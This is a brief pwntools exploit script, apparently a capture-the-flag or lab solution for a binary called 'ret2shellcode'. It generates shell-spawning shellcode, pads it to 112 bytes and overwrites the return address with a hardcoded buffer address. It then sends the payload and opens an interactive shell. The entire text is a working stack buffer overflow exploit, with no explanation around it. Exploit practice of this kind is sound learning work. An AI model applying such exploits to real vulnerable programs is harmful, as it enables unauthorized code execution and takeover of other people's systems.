from pwn import *

p=process("./ret2shellcode")

gdb.attach(p)

shellcode=asm(shellcraft.sh())

buf2_addrs=0x0804A080

payload=shellcode.ljust(112,"a")+p32(buf2_addrs)

p.sendline(payload)

p.interactive()
